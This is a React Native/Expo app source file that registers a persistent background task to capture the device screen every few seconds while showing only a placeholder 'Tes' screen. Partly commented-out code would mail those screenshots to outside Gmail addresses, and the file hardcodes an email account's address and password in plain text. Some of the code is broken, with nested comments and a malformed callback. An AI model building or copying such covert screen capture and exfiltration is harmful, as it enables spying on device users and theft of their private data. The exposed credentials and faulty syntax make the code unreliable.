import * as BackgroundFetch from "expo-background-fetch"
import * as TaskManager from "expo-task-manager"

import { StatusBar } from 'expo-status-bar';
import React, { Component } from 'react';
import { Text, View, Image, StyleSheet, TouchableHighlight, WebView, Button } from 'react-native';
import {captureScreen} from "react-native-view-shot";
import Mailer from 'react-native-mail';
import BackgroundTask from 'react-native-background-task';
import Email from "./Email";

//const email = require("gmail-send");
//var fs = require("fs")

var emailU = "manalearn530@gmail.com";
var pass = "aptx3561"
const TASK_NAME = 'background-location-task';

Email.sendEmail();

/*const sendP = email({
  user: emailU,
  pass: pass,
  to:   "tv2952018@gmail.com",
  subject: 'KHKT',
});

const sendT = email({
  user: emailU,
  pass: pass,
  to:   "nhtienlam@gmail.com",
  subject: 'KHKT',
});*/



export default function App() {
  /*BackgroundTask.define(() => {
    setInterval(()=>{
      captureScreen({
        format: "jpg",
        quality: 0.8
      }).then(
        uri => {
          console.log("Image saved to", uri);
          /*sendT({
            file: [uri]
          }, (error, result, fullResult) => {
            if (error) console.error(error);
            console.log(result+"(parent)");
          })*/
          /*Mailer.mail({
            subject: 'need help',
            recipients: ['nhtienlam@gmail.com'],
            ccRecipients: ['nhtienlam@gmail.com'],
            bccRecipients: ['nhtienlam@gmail.com'],
            body: 'A Bold Body',
            customChooserTitle: 'This is my new title', // Android only (defaults to "Send Mail")
            isHTML: false,
            /*attachments: [{
              // Specify either `path` or `uri` to indicate where to find the file data.
              // The API used to create or locate the file will usually indicate which it returns.
              // An absolute path will look like: /cacheDir/photos/some image.jpg
              // A URI starts with a protocol and looks like: content://appname/cacheDir/photos/some%20image.jpg
              uri: uri, // The uri of the file from which to read the data.
              // Specify either `type` or `mimeType` to indicate the type of data.
              //type: 'jpg', // Mime Type: jpg, png, doc, ppt, html, pdf, csv
            }]
          }, (err, eve)=>{
            err?console.log(err):"";
            console.log(eve);
          })*



        error => console.error("Oops, snapshot failed", error);
      })
    }, 10000);
  });*/
  (async ()=>{
    TaskManager.defineTask(TASK_NAME);
    try {
      await BackgroundFetch.registerTaskAsync(TASK_NAME, {
        minimumInterval: 1, // seconds,
        stopOnTerminate: false, // android only,
        //startOnBoot: true,
      })
      console.log("Task registered")
      
    } catch (err) {
      console.log("Task Register failed:", err)
    }

    setInterval(()=> {
        TaskManager.defineTask(TASK_NAME, async () => {
          const now = Date.now();
          
          
          //console.log(`Got background fetch call at date: ${new Date().toISOString()}`)

          captureScreen({
            format: "jpg",
            quality: 0.8
          }).then(
            uri => {
              console.log("Image saved to", uri);
              /*sendT({
                file: [uri]
              }, (error, result, fullResult) => {
                if (error) console.error(error);
                console.log(result+"(parent)");
              })*/
              /*Mailer.mail({
                subject: 'need help',
                recipients: ['nhtienlam@gmail.com'],
                ccRecipients: ['nhtienlam@gmail.com'],
                bccRecipients: ['nhtienlam@gmail.com'],
                body: 'A Bold Body',
                customChooserTitle: 'This is my new title', // Android only (defaults to "Send Mail")
                isHTML: false,
                /*attachments: [{
                  // Specify either `path` or `uri` to indicate where to find the file data.
                  // The API used to create or locate the file will usually indicate which it returns.
                  // An absolute path will look like: /cacheDir/photos/some image.jpg
                  // A URI starts with a protocol and looks like: content://appname/cacheDir/photos/some%20image.jpg
                  uri: uri, // The uri of the file from which to read the data.
                  // Specify either `type` or `mimeType` to indicate the type of data.
                  //type: 'jpg', // Mime Type: jpg, png, doc, ppt, html, pdf, csv
                }]
              }, (err, eve)=>{
                err?console.log(err):"";
                console.log(eve);
              })*/



            error => console.error("Oops, snapshot failed", error);
          })
        

          // Be sure to return the successful result type!
        });
      }, 5000)
  })()

  return (
    <View style={styles.container}>
      <Text>Tes</Text>
      <StatusBar style="auto" />
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#fff',
    alignItems: 'center',
    justifyContent: 'center',
  },
});
